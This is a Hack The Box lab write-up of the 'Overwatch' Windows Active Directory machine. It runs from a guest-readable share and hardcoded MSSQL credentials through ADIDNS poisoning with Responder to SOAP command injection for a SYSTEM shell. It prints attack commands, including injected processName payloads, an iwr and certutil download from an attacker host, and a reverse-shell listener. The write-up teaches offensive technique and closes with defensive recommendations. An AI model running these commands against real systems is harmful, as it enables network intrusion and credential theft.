---
title: "Overwatch — ADIDNS Poisoning and WCF SOAP Command Injection"
description: "A monitoring binary leaks MSSQL credentials; ADIDNS poisoning captures more, and WCF command injection returns a SYSTEM shell."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - adidns
  - mssql
  - linked-server
  - wcf
  - command-injection
objective: "Hardcoded MSSQL credentials leading to ADIDNS poisoning and WCF SOAP RCE"
tools:
  - rustscan
  - nxc
  - ILSpy
  - impacket-mssqlclient
  - dnstool.py
  - Responder
  - Ligolo-ng
  - evil-winrm
  - curl
  - nc
skill: "ADIDNS poisoning, linked-server credential capture, and SOAP command injection"
outcome: "SYSTEM shell"
---

## Summary

Overwatch is a Medium-rated Hack The Box Active Directory lab combining credential recovery from a guest-readable SMB share with ADIDNS poisoning and WCF SOAP command injection. A .NET monitoring executable in an unauthenticated SMB share contains hardcoded MSSQL credentials. The database instance exposes a linked server entry that cannot be resolved by DNS; ADIDNS poisoning via krbrelayx's dnstool registers a spoofed A record, and a linked server query triggers cleartext credential capture through Responder. The recovered credentials grant WinRM access. An internal WCF service on port 8000 — reachable only via Ligolo tunnel — exposes a `KillProcess` operation vulnerable to command injection through unsanitised `processName` input, returning a SYSTEM shell. Passwords, hashes, IPs, and flags are redacted; command patterns and technique syntax are preserved.

## Context and Objective

- **Target:** Windows Server 2022 domain controller on a target domain with DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), MSSQL on non-standard port (6520), and .NET Message Framing (9389)
- **Starting position:** unauthenticated; no initial credentials provided
- **Objective:** Enumerate services, obtain initial access, pivot to an internal WCF service, and escalate to domain compromise
- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment

## Approach and Evidence

### 1. Service Enumeration

Observation: standard AD services plus MSSQL on a non-standard port. The non-default port 6520 (standard 1433) suggests deliberate obscurity.

Action: full TCP port scan of the target.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Overwatch-TCP
```

Representative output (truncated):

```text
PORT      STATE  SERVICE        VERSION
53/tcp    open   domain         Simple DNS Plus
88/tcp    open   kerberos-sec   Microsoft Windows Kerberos
389/tcp   open   ldap           Microsoft Windows AD LDAP (Domain: <TARGET_DOMAIN>)
445/tcp   open   microsoft-ds?
6520/tcp  open   ms-sql-s       Microsoft SQL Server 2022 16.00.1000
9389/tcp  open   mc-nmf         .NET Message Framing
```

Technical significance: the MSSQL instance on port 6520 is the eventual credential-recovery surface; the .NET Message Framing service indicates AD Web Services.

Result: the recorded output shows an AD domain with MSSQL on a non-standard port and .NET services.

### 2. SMB Enumeration — Guest-Readable Share

Observation: unauthenticated SMB access reveals a non-standard `software$` share with read permissions.

Action: enumerate shares, then spider all content.

```bash
nxc smb <TARGET_IP> -u 'a' -p '' --shares
nxc smb <TARGET_IP> -u 'a' -p '' -M spider_plus
```

Representative finding: `software$` share contains a `monitor` subdirectory with executables and configuration files.

Technical significance: a guest-readable share containing compiled application binaries on a domain controller is unusual and warrants static analysis.

Result: the recorded output shows a `software$` share readable without authentication containing monitoring executables.

### 3. Static Analysis — Hardcoded Credentials

Observation: decompiling `overwatch.exe` with ILSpy reveals a hardcoded SQL connection string.

Action: open the binary in a .NET decompiler and inspect connection logic.

```csharp
SqlConnection val = new SqlConnection(
    "Server=localhost;Database=<APPLICATION_DATABASE>;User Id=<SQL_SERVICE_ACCOUNT>;Password=<SQL_SVC_PASSWORD>"
);
```

Technical significance: hardcoded credentials in a compiled binary recoverable by any .NET decompiler; the `software$` share being guest-readable means anonymous SMB access immediately yields database credentials.

Result: the recorded output shows recovered MSSQL service account credentials.

### 4. Static Analysis — WCF Service Configuration

Observation: `overwatch.exe.config` reveals an internal WCF service on port 8000.

```xml
<service name="MonitoringService">
  <host>
    <baseAddresses>
      <add baseAddress="http://<TARGET_HOSTNAME>:8000/<SERVICE_PATH>" />
    </baseAddresses>
  </host>
</service>
```

Technical significance: port 8000 did not appear in the external port scan, confirming it is internal-only and requires pivoting to reach.

Result: the recorded output shows an internal WCF service endpoint bound to localhost.

### 5. MSSQL Access — Linked Server Discovery

Observation: connecting to the SQL instance with recovered credentials and enumerating linked servers reveals `<LINKED_SERVER_NAME>`, which cannot be resolved by DNS.

Action: connect to MSSQL and query linked servers.

```bash
impacket-mssqlclient <TARGET_DOMAIN>/<SQL_SERVICE_ACCOUNT>:'<SQL_SVC_PASSWORD>'@<TARGET_IP> \
  -port 6520 -windows-auth
```

```sql
SELECT name, provider, data_source FROM sys.servers WHERE is_linked = 1;
SELECT * FROM [<LINKED_SERVER_NAME>].master.sys.databases;
```

Representative finding: the linked server query returns a login timeout error — `<LINKED_SERVER_NAME>` has no DNS record.

Technical significance: an unresolvable linked server name presents an ADIDNS poisoning opportunity; if a spoofed DNS record redirects `<LINKED_SERVER_NAME>` to an attacker-controlled host, the MSSQL server transmits credentials when the linked server query is triggered.

Result: the recorded output shows a linked server entry with no corresponding DNS resolution.

### 6. ADIDNS Poisoning — Credential Capture

Observation: Active Directory Integrated DNS stores DNS records as AD objects. By default, any authenticated domain user can create new DNS records. Since the recovered service account is a domain account, it can write a spoofed A record for `<LINKED_SERVER_NAME>`.

Action: inject a DNS record pointing `<LINKED_SERVER_NAME>` to the attacker, start Responder, and trigger the linked server query.

```bash
python3 dnstool.py -u '<TARGET_DOMAIN>\<SQL_SERVICE_ACCOUNT>' -p '<SQL_SVC_PASSWORD>' \
  -r '<LINKED_SERVER_NAME>' -a add -d '<ATTACKER_IP>' <TARGET_IP>
```

```bash
sudo responder -I tun0
```

```sql
EXEC ('SELECT name FROM sys.databases') AT [<LINKED_SERVER_NAME>];
```

Representative finding: Responder captures cleartext MSSQL credentials from the linked server authentication attempt.

```text
[MSSQL] Cleartext Client   : <TARGET_IP>
[MSSQL] Cleartext Hostname : <LINKED_SERVER_NAME> ()
[MSSQL] Cleartext Username : <SQL_MANAGEMENT_ACCOUNT>
[MSSQL] Cleartext Password : <SQL_MGMT_PASSWORD>
```

Technical significance: MSSQL linked server connections using the SQLNCLI provider with SQL Server authentication transmit credentials via TDS (Tabular Data Stream). When connecting to a non-SQL endpoint, the authentication phase transmits credentials in a form Responder parses as cleartext — distinct from Windows authentication, which produces an NTLMv2 hash.

Result: the recorded output shows captured cleartext credentials for a second MSSQL account.

### 7. WinRM Access — Initial Foothold

Observation: the recovered SQL management credentials authenticate via WinRM.

Action: establish a WinRM session.

```bash
evil-winrm -i <TARGET_IP> -u '<SQL_MANAGEMENT_ACCOUNT>' -p '<SQL_MGMT_PASSWORD>'
```

Result: the recorded output shows a WinRM session established; user flag obtained.

### 8. Internal Service Discovery — WCF on Port 8000

Observation: `netstat -ano` confirms port 8000 listening internally, consistent with the WCF configuration. Process ID 4 indicates the service runs as `NT AUTHORITY\SYSTEM`.

```powershell
netstat -ano | findstr LISTEN
```

```text
TCP    0.0.0.0:8000    0.0.0.0:0    LISTENING    4
```

Technical significance: the WCF service is internal-only and runs as SYSTEM — a high-value target for command injection.

Result: the recorded output confirms the WCF service is reachable only from within the target.

### 9. Port Forwarding via Ligolo-ng

Observation: the WCF service is bound to localhost; Ligolo-ng creates a transparent proxy tunnel to reach it.

Action: deploy Ligolo agent on the target and add a route on the attack machine.

```powershell
iwr -OutFile C:\Windows\Temp\agent.exe http://<ATTACKER_IP>/agent.exe
.\agent.exe -connect <ATTACKER_IP>:11601 -v -accept-fingerprint <FINGERPRINT>
```

```bash
sudo ip route add <PIVOT_IP>/32 dev ligolo
```

Technical significance: Ligolo-ng routes traffic to `<PIVOT_IP>` to `127.0.0.1` on the target, making the internal WCF service reachable at `http://<PIVOT_IP>:8000/MonitorService`.

Result: the recorded output shows the tunnel established and the WCF service reachable.

### 10. WCF SOAP Service Analysis

Observation: fetching the WSDL describes an `IMonitoringService` interface with a `KillProcess` operation accepting a `processName` string.

```bash
curl -s http://<PIVOT_IP>:8000/MonitorService?wsdl
```

```xml
<xs:element name="KillProcess">
  <xs:complexType>
    <xs:sequence>
      <xs:element minOccurs="0" name="processName" nillable="true" type="xs:string"/>
    </xs:sequence>
  </xs:complexType>
</xs:element>
```

Technical significance: a SYSTEM-level service accepting an unsanitised string passed to a process-killing routine creates a command injection opportunity if the value reaches `cmd.exe` or PowerShell without validation.

Result: the recorded output shows the WSDL schema with the injectable parameter.

### 11. Command Injection — Proof of Concept

Observation: injecting a semicolon-delimited command through `processName` executes as SYSTEM.

Action: send a SOAP payload creating a file to confirm code execution.

```xml
<tem:processName>notepad.exe ; type nul > C:\Users\<WINRM_USER>\Documents\test_rce</tem:processName>
```

```bash
curl -s -X POST http://<PIVOT_IP>:8000/MonitorService \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" \
  --data @poc.xml
```

Result: the recorded output shows the file exists in the target's Documents folder, confirming command injection.

### 12. SYSTEM Shell via SOAP Command Injection

Observation: the confirmed injection point allows deploying and executing a reverse shell as SYSTEM.

Action: stage a PowerShell reverse shell via `certutil`, then execute it through the SOAP endpoint.

```xml
<tem:processName>notepad.exe ; certutil -urlcache -split -f <REMOTE_BINARY> C:\Users\<WINRM_USER>\Documents\shell.ps1</tem:processName>
```

```xml
<tem:processName>notepad.exe ; C:\Users\<WINRM_USER>\Documents\shell.ps1</tem:processName>
```

```bash
nc -lvnp 9001
```

Representative finding: the reverse shell connects back as SYSTEM.

```text
PS C:\Software\Monitoring> whoami
nt authority\system
```

Technical significance: the full chain — from guest-readable SMB share to SYSTEM — required no CVEs; each step exploited a configuration weakness or missing input validation.

Result: the recorded output shows a SYSTEM shell; root flag obtained.

## Challenges and Decisions

- **Non-standard MSSQL port:** the SQL instance on port 6520 rather than the default 1433 required targeted scanning; the non-standard port did not prevent exploitation once discovered.
- **ADIDNS poisoning surface:** by default, any authenticated domain user can create DNS records in ADIDNS; the linked server's SQLNCLI provider transmits credentials in cleartext to non-SQL endpoints, making credential capture trivial once DNS is controlled.
- **Internal-only WCF service:** port 8000 was not visible externally, requiring Ligolo-ng tunneling; the service ran as SYSTEM (PID 4), making the injection immediately high-impact.

## Outcome

The recorded evidence establishes a complete attack chain from unauthenticated access to SYSTEM-level compromise through five linked weaknesses: guest-readable SMB share with hardcoded credentials, ADIDNS poisoning exploiting default write permissions, linked server cleartext authentication, WinRM access, and SOAP command injection in a SYSTEM-level service. No CVEs were required; each step exploited configuration weaknesses or missing input validation.

## Lessons and Recommendations

- **Never hardcode credentials in compiled binaries.** Connection strings must use encrypted configuration stores, Windows DPAPI-protected files, or managed service accounts. Placing binaries with hardcoded production credentials in a guest-readable SMB share means anonymous access immediately yields database access.

- **Restrict ADIDNS write permissions.** Apply DNS-specific ACLs to prevent non-administrator accounts from creating arbitrary DNS records. Monitor for unexpected A record creation, particularly for names matching linked server configurations.

- **Sanitise input in privileged service operations.** The `KillProcess` SOAP operation passed its parameter directly to an OS-level execution context without validation. Any SYSTEM-level service accepting external input must validate against a whitelist and must never pass input to a shell interpreter. Running the service as a dedicated least-privilege account would contain the blast radius.

- **Use Windows authentication for linked servers.** SQL Server authentication on linked server connections transmits credentials in cleartext via TDS when connecting to non-SQL endpoints. Windows (Kerberos) authentication avoids this exposure.

## References

- Platform: Hack The Box — Medium Windows Active Directory machine — [Overwatch](https://app.hackthebox.com/machines/Overwatch)
